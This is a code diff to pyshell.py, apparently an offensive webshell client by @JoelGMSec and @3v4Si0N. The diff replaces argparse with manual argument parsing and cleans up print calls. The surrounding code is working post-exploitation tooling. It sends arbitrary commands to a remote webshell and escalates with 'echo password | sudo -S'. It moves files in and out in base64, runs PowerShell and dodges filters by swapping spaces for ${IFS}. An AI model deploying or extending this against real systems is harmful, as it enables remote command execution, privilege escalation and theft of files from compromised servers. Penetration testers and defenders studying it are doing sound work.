@@ -6,7 +6,6 @@ import urllib3
 import pwinput
 import requests
 import readline
-import argparse
 import sys, os, re
 import neotermcolor
 from sys import argv
@@ -65,10 +64,10 @@ def is_error_output(output):
 
 def send_command(command, webshell, method, param="code"):
     headers = {"User-Agent":"Mozilla/6.4 (Windows NT 11.1) Gecko/2010102 Firefox/99.0",
-    "Authorization":args.auth, "Cookie":args.cookies, "Content-Type":"application/x-www-form-urlencoded"}
+    "Authorization":AUTH, "Cookie":COOKIES, "Content-Type":"application/x-www-form-urlencoded"}
     command = command + " 2>&1"
     params = {param.strip():command.strip()}
-    if args.noenc:
+    if NOENC:
         params = urllib.parse.urlencode(params, safe='|!"#$%&/()=?,.-;:_][]}{><')
     else:
         params = urllib.parse.urlencode(params, safe='')
@@ -77,6 +76,20 @@ def send_command(command, webshell, method, param="code"):
     elif (method.upper() == "POST"):
         response = requests.post((webshell), data=params, headers=headers, verify=False)
     return response.content.decode(errors="ignore")
+
+def show_help():
+    print(colored("[!] Usage: pyshell.py <URL> <METHOD> [OPTIONS]\n", "red"))
+    print(colored("OPTIONS:", "yellow"))
+    print(colored("  -a <auth>        Authorization header", "blue"))
+    print(colored("  -c <cookies>     Cookie header", "blue"))
+    print(colored("  -p <param>       Parameter name (default: code)", "blue"))
+    print(colored("  -ne              Disable URL encoding on key chars", "blue"))
+    print(colored("  -np              Disable HTML <pre> tags parser", "blue"))
+    print(colored("  -pi              Pipe all commands after parameter", "blue"))
+    print(colored("  -ifs             Replace spaces with IFS", "blue"))
+    print(colored("  -su              Sudo command execution (Linux only)", "blue"))
+    print(colored("  -ps              PowerShell execution (Windows only)", "blue"))
+    print()
 
 if __name__ == "__main__":
     banner = """
@@ -93,54 +106,92 @@ if __name__ == "__main__":
   -------------- by @JoelGMSec & @3v4Si0N ---------------
  """
 
-    print (colored(banner, "green"))
-    parser = argparse.ArgumentParser()
-    parser.add_argument("url", help="Webshell URL", type=str)
-    parser.add_argument("method", help="HTTP Method to execute command (GET or POST)", type=str)
-    parser.add_argument("-a", "--auth", help="Authorization header to use on each request", type=str)
-    parser.add_argument("-c", "--cookies", help="Cookie header to use on each request", type=str)
-    parser.add_argument("-p", "--param", default="code", help="Parameter to use with custom WebShell", type=str)
-    parser.add_argument("-ne", "--noenc", action="store_true", help="Disable URL encode on key chars")
-    parser.add_argument("-np", "--nopre", action="store_true", help="Disable HTML <pre> tags parser")
-    parser.add_argument("-pi", "--pipe", action="store_true", help="Pipe all commands after parameter")
-    parser.add_argument("-ifs", "--ifs", action="store_true", help="Replace all white spaces with Internal Field Separator")
-    parser.add_argument("-su", "--sudo", action="store_true", help="Sudo command execution (Only on Linux hosts)")
-    parser.add_argument("-ps", "--PowerShell", action="store_true", help="PowerShell command execution (Only on Windows hosts)")
-    args = parser.parse_args()
+    print(colored(banner, "green"))
+    WEBSHELL = None
+    HTTP_METHOD = None
+    PARAM = "code"
+    AUTH = ""
+    COOKIES = ""
+    NOENC = False
+    NOPRE = False
+    PIPE_FLAG = False
+    IFS = False
+    SUDO = False
+    POWERSHELL = False
+    disable_pw = False
+
+    i = 1
+    while i < len(argv):
+        if argv[i] in ["-h", "--help"]:
+            show_help()
+            sys.exit(0)
+        elif argv[i] == "-a" and i + 1 < len(argv):
+            AUTH = argv[i + 1]
+            i += 1
+        elif argv[i] == "-c" and i + 1 < len(argv):
+            COOKIES = argv[i + 1]
+            i += 1
+        elif argv[i] == "-p" and i + 1 < len(argv):
+            PARAM = argv[i + 1]
+            i += 1
+        elif argv[i] == "-ne":
+            NOENC = True
+        elif argv[i] == "-np":
+            NOPRE = True
+        elif argv[i] == "-pi":
+            PIPE_FLAG = True
+        elif argv[i] == "-ifs":
+            IFS = True
+        elif argv[i] == "-su":
+            SUDO = True
+        elif argv[i] == "-ps":
+            POWERSHELL = True
+        elif argv[i] == "-npw":
+            disable_pw = True
+        elif not WEBSHELL:
+            WEBSHELL = argv[i]
+        elif not HTTP_METHOD:
+            HTTP_METHOD = argv[i]
+        i += 1
+
+    if not WEBSHELL or not HTTP_METHOD:
+        show_help()
+        sys.exit(1)
+
+    if HTTP_METHOD.upper() not in ["GET", "POST"]:
+        print(colored("[!] Error: METHOD must be GET or POST\n", "red"))
+        show_help()
+        sys.exit(1)
 
     sudo_enabled = False
     sudo_password = None
     supersu = False
     original_whoami = None
     root = False
-    disable_pw = ("-npw" in argv)
     readline.set_completer(completer)
     readline.parse_and_bind("tab: complete")
 
     try:
-        WEBSHELL = args.url
-        HTTP_METHOD = args.method
-        PARAM = args.param
         PIPE = ""
         COMMAND_LIST = ["ls", "dir", "cat", "type", "rm", "del", "file"]
         if str(sys.platform) == "linux":
             localslash = "/"
         else:
             localslash = "\\" 
-        if args.pipe:
+        if PIPE_FLAG:
             PIPE = "|"
         whoami = send_command(PIPE + "whoami", WEBSHELL, HTTP_METHOD, PARAM)
-        if args.nopre:
+        if NOPRE:
             whoami = "<pre>" + whoami + "</pre>"
         if not "<pre>" in whoami:
-            print (colored("[!] Command output not found! Exiting..\n", "red"))
+            print(colored("[!] Command output not found! Exiting..\n", "red"))
             sys.exit()                      
         if "<pre>" in whoami:
             whoami = str(whoami).split("<pre>", 1)[1] ; whoami = str(whoami).split("</pre>", 1)[0]
             whoami = remove_html(whoami)
         original_whoami = whoami   
         hostname = send_command(PIPE + "hostname", WEBSHELL, HTTP_METHOD, PARAM)
-        if args.nopre:
+        if NOPRE:
             hostname = "<pre>" + hostname + "</pre>"
         if "<pre>" in hostname:
             hostname = str(hostname).split("<pre>", 1)[1] ; hostname = str(hostname).split("</pre>", 1)[0]
@@ -148,7 +199,7 @@ if __name__ == "__main__":
         cwd = "" ; slash = "\\"
         if not slash in whoami:
             path = send_command(PIPE + "pwd", WEBSHELL, HTTP_METHOD, PARAM)
-            if args.nopre:
+            if NOPRE:
                 path = "<pre>" + path + "</pre>"
             if "<pre>" in path:
                 path = str(path).split("<pre>", 1)[1] ; path = str(path).split("</pre>", 1)[0]
@@ -156,7 +207,7 @@ if __name__ == "__main__":
             system = "linux" ; slash = "/"
         else:
             path = send_command(PIPE + "cmd /c echo %cd%", WEBSHELL, HTTP_METHOD, PARAM)
-            if args.nopre:
+            if NOPRE:
                 path = "<pre>" + path + "</pre>"
             if "<pre>" in path:
                 path = str(path).split("<pre>", 1)[1] ; path = str(path).split("</pre>", 1)[0]
@@ -176,10 +227,10 @@ if __name__ == "__main__":
                 cinput += (colored(" ", "yellow"))
                 command = input(cinput + "\001\033[0m\002")
                 
-                if args.ifs:
+                if IFS:
                     command = command.replace(" ","${IFS}")
                     space = "${IFS}"
-                if not args.ifs:
+                if not IFS:
                     space = " "
                     
                 if command == "exit":
@@ -190,7 +241,7 @@ if __name__ == "__main__":
                         whoami = original_whoami
                         print()
                     else:
-                        print (colored("[!] Exiting..\n", "red"))
+                        print(colored("[!] Exiting..\n", "red"))
                         break
                 else:
                     if len(command) == 0:
@@ -215,9 +266,9 @@ if __name__ == "__main__":
                             if not sudo_enabled:
                                 print(colored(f"[sudo] password for {str(whoami)}:\n", "red"))
                                 if disable_pw:
-                                    sudo_password = sudo_pass = input(cinput + "\001\033[0m\002")
+                                    sudo_password = input(cinput + "\001\033[0m\002")
                                 else:
-                                    sudo_pass = pwinput.pwinput(prompt=(cinput + "\001\033[0m\002"))
+                                    sudo_password = pwinput.pwinput(prompt=(cinput + "\001\033[0m\002"))
                                 check_sudo = send_command(PIPE + f"echo '{sudo_password}' | sudo -S whoami", WEBSHELL, HTTP_METHOD, PARAM)
                                 if "root" in check_sudo:
                                     sudo_enabled = True
@@ -234,14 +285,14 @@ if __name__ == "__main__":
                             if not sudo_enabled:
                                 print(colored(f"[sudo] password for {str(whoami)}:\n", "red"))
                                 if disable_pw:
-                                    sudo_password = sudo_pass = input(cinput + "\001\033[0m\002")
+                                    sudo_password = input(cinput + "\001\033[0m\002")
                                 else:
-                                    sudo_pass = pwinput.pwinput(prompt=(cinput + "\001\033[0m\002"))
+                                    sudo_password = pwinput.pwinput(prompt=(cinput + "\001\033[0m\002"))
                                 check_sudo = send_command(PIPE + f"echo '{sudo_password}' | sudo -S whoami", WEBSHELL, HTTP_METHOD, PARAM)
                                 if "root" in check_sudo:
                                     sudo_enabled = True
                                     content = send_command(PIPE + f"echo '{sudo_password}' | sudo -S {sudo_command}", WEBSHELL, HTTP_METHOD, PARAM)
-                                    if args.nopre:
+                                    if NOPRE:
                                         content = "<pre>" + content + "</pre>"
                                     if "<pre>" in content:
                                         content = str(content).split("<pre>", 1)[1] ; content = str(content).split("</pre>", 1)[0]
@@ -257,7 +308,7 @@ if __name__ == "__main__":
                                     sudo_password = None
                             else:
                                 content = send_command(PIPE + f"echo '{sudo_password}' | sudo -S {sudo_command}", WEBSHELL, HTTP_METHOD, PARAM)
-                                if args.nopre:
+                                if NOPRE:
                                     content = "<pre>" + content + "</pre>"
                                 if "<pre>" in content:
                                     content = str(content).split("<pre>", 1)[1] ; content = str(content).split("</pre>", 1)[0]
@@ -285,7 +336,7 @@ if __name__ == "__main__":
                         if system != "windows":
                             print(colored("[!] Error: import-ps1 only works on Windows hosts\n", "red"))
                         else:
-                            if args.ifs:
+                            if IFS:
                                 command = command.replace("${IFS}"," ")
                             if len(command.split()) < 2:
                                 print(colored("[!] Usage: import-ps1 \"/path/script.ps1\"\n", "red"))
@@ -322,10 +373,10 @@ if __name__ == "__main__":
                         continue
                         
                     if "upload" in command.split()[0]:
-                        if args.ifs:
+                        if IFS:
                             command = command.replace("${IFS}"," ")
                         if len(command.split()) == 1 or len(command.split()) == 2:
-                            print (colored("[!] Usage: upload local_file.ext remote_file.ext\n", "red"))
+                            print(colored("[!] Usage: upload local_file.ext remote_file.ext\n", "red"))
                         else:
                             localfile = command.split()[1]
                             remotefile = command.split()[2]
@@ -340,13 +391,13 @@ if __name__ == "__main__":
                             remotefiletmp = remotefile.rstrip() + ".tmp"
                             if not localslash in localfile:
                                 cwd = os.getcwd()
-                                print (colored("[+] Uploading file " + cwd + localslash + localfile + " on " + remotefile + "..\n", "green"))
+                                print(colored("[+] Uploading file " + cwd + localslash + localfile + " on " + remotefile + "..\n", "green"))
                             else:
-                                print (colored("[+] Uploading file " + localfile + " on " + remotefile + "..\n", "green"))
+                                print(colored("[+] Uploading file " + localfile + " on " + remotefile + "..\n", "green"))
                             try:
                                 f = open(localfile, "rb") ; rawfiledata = f.read() ; base64data = base64.b64encode(rawfiledata)
                             except OSError:
-                                print (colored("[!] Local file " + localfile + " does not exist!\n", "red"))
+                                print(colored("[!] Local file " + localfile + " does not exist!\n", "red"))
                                 continue
                             upload = send_command(PIPE + "echo" + space + str(base64data.rstrip(), "utf8") + space +
                             ">" + space + remotefile, WEBSHELL, HTTP_METHOD, PARAM)
@@ -362,10 +413,10 @@ if __name__ == "__main__":
                                     send_command(PIPE + "$base64 = cat -Encoding UTF8 " + remotefile + command + remotefile, WEBSHELL, HTTP_METHOD, PARAM)
                     else:
                         if "download" in command.split()[0]: 
-                            if args.ifs:
+                            if IFS:
                                 command = command.replace("${IFS}"," ")
                             if len(command.split()) == 1 or len(command.split()) == 2:
-                                print (colored("[!] Usage: download remote_file.ext local_file.ext\n", "red"))
+                                print(colored("[!] Usage: download remote_file.ext local_file.ext\n", "red"))
                             else:
                                 remotefile = command.split()[1]
                                 localfile = command.split()[2]
@@ -376,15 +427,15 @@ if __name__ == "__main__":
                                     if localfile == ".":
                                         localfile = command.split()[1]
                                         localfile = localfile.split(slash)[-1]
-                                    print (colored("[+] Downloading file " + remotefile + " on " + cwd + localslash + localfile + "..\n", "green"))
+                                    print(colored("[+] Downloading file " + remotefile + " on " + cwd + localslash + localfile + "..\n", "green"))
                                 else:
-                                    print (colored("[+] Downloading file " + remotefile + " on " + localfile + "..\n", "green"))
+                                    print(colored("[+] Downloading file " + remotefile + " on " + localfile + "..\n", "green"))
                                 if system == "linux":
                                     base64data = send_command(PIPE + "base64" + space + remotefile, WEBSHELL, HTTP_METHOD, PARAM) 
                                 if system == "windows":
                                     command = "[Convert]::ToBase64String([IO.File]::ReadAllBytes('"+remotefile+"'))" 
                                     base64data = send_command(PIPE + command, WEBSHELL, HTTP_METHOD, PARAM)
-                                if args.nopre:
+                                if NOPRE:
                                     base64data = "<pre>" + base64data + "</pre>"
                                 if "<pre>" in base64data:
                                     base64data = str(base64data).split("<pre>", 1)[1] ; base64data = str(base64data).split("</pre>", 1)[0]
@@ -398,16 +449,16 @@ if __name__ == "__main__":
                                 try:
                                     f = open(localfile, "wb") ; f.write(download) ; f.close()
                                 except OSError:
-                                    print (colored("[!] Error writing " + localfile + ", check path and perms!\n", "red"))
+                                    print(colored("[!] Error writing " + localfile + ", check path and perms!\n", "red"))
                                     continue
                         else:
                             if "pwd" in command.split()[0]:
                                 path = str(path) + "\n"
-                                print (colored(path, "white"))
+                                print(colored(path, "white"))
                             else:
                                 if "cd" in command.split()[0]:
                                     old_path = path
-                                    if args.ifs:
+                                    if IFS:
                                         command = command.replace("${IFS}"," ")
                                     if command.split()[1] == ".":
                                         continue
@@ -457,7 +508,7 @@ if __name__ == "__main__":
                                         if not slash in relative_path:
                                             command = cmd + space + param + path.rstrip() + slash + relative_path
                                         content = send_command(PIPE + command, WEBSHELL, HTTP_METHOD, PARAM)
-                                        if args.nopre:
+                                        if NOPRE:
                                             content = "<pre>" + content + "</pre>"
                                         if "<pre>" in content:
                                             content = str(content).split("<pre>", 1)[1] ; content = str(content).split("</pre>", 1)[0]
@@ -469,9 +520,9 @@ if __name__ == "__main__":
                                         else:
                                             print(colored(content, "white"))
                                     else:
-                                        if args.PowerShell:
+                                        if POWERSHELL:
                                             content = send_command(PIPE + "powershell " + command, WEBSHELL, HTTP_METHOD, PARAM)
-                                            if args.nopre:
+                                            if NOPRE:
                                                 content = "<pre>" + content + "</pre>"
                                             if "<pre>" in content:
                                                 content = str(content).split("<pre>", 1)[1] ; content = str(content).split("</pre>", 1)[0]
@@ -485,7 +536,7 @@ if __name__ == "__main__":
                                         else:
                                             if sudo_enabled and sudo_password and system == "linux":
                                                 content = send_command(PIPE + f"echo '{sudo_password}' | sudo -S {command}", WEBSHELL, HTTP_METHOD, PARAM)
-                                                if args.nopre:
+                                                if NOPRE:
                                                     content = "<pre>" + content + "</pre>"
                                                 if "<pre>" in content:
                                                     content = str(content).split("<pre>", 1)[1] ; content = str(content).split("</pre>", 1)[0]
@@ -498,7 +549,7 @@ if __name__ == "__main__":
                                                     print(colored(content, "white")) 
                                             else:
                                                 content = send_command(PIPE + command, WEBSHELL, HTTP_METHOD, PARAM)
-                                                if args.nopre:
+                                                if NOPRE:
                                                     content = "<pre>" + content + "</pre>"
                                                 if "<pre>" in content:
                                                     content = str(content).split("<pre>", 1)[1] ; content = str(content).split("</pre>", 1)[0]
@@ -511,11 +562,11 @@ if __name__ == "__main__":
                                                     print(colored(content, "white")) 
 
             except KeyboardInterrupt:
-                print (colored("\n[!] Exiting..\n", "red"))
+                print(colored("\n[!] Exiting..\n", "red"))
                 break
 
             except:
                 pass
 
     except:
-        print (colored("\n[!] Error getting connection!\n", "red"))
+        print(colored("\n[!] Error getting connection!\n", "red"))
